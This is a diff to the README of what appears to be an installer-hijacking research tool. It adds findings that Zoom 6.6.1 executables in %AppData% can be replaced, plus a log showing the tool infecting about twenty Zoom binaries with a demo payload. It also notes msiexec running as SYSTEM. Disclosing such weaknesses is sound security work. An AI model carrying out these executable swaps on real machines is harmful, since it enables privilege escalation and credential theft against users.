@@ -155,12 +155,37 @@ Targeting a single directory (such as `%TEMP%`) at a time can increase the likel
 
 ## Findings
 
-- Zoom 6.6.1 (15968) uses %AppData% for .exe allowing lateral process movement and
-  process spoofing (send elevation request from Zoom update).
+- Zoom 6.6.1 (15968) uses %AppData% for .exe install and updates allowing lateral process movement and
+  process spoofing (e.g. send elevation request from Zoom update). Executables can be manipulated easily
+  for credential stealing attacks and malicious purposes.
+
+```
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\airhost.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\aomhost64.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\CptControl.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\CptHost.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\CptInstall.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\CptService.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\Installer.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\zCrashReport.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\zCrashReport64.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\Zoom.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\ZoomDocConverter.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\ZoomHybridConf.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\ZoomOutlookIMPlugin.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\ZoomOutlookMAPI\ZoomOutlookMAPI.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\ZoomOutlookMAPI\ZoomOutlookMAPI64.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\Zoom_launcher.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\zTscoder.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\zUpdater.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\bin\zWebview2Agent.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\uninstall\Installer.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+[2025-09-24 19:27:31] [SetupHijack] Infecting: C:\Users\Fantastic\AppData\Roaming\Zoom\ZoomDownload\Installer.exe with payload: c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe
+```
 
 - msiexec.exe when running install.msi executes under NT AUTHORITY\SYSTEM
 
-- Wireshark update exe comes through %Temp%
+- Wireshark update exe comes through %Temp%, didn't win race.
 
 - Visual Studio code-signing checks on updates prevent exploitation, (lightly tested .VSIX)
 
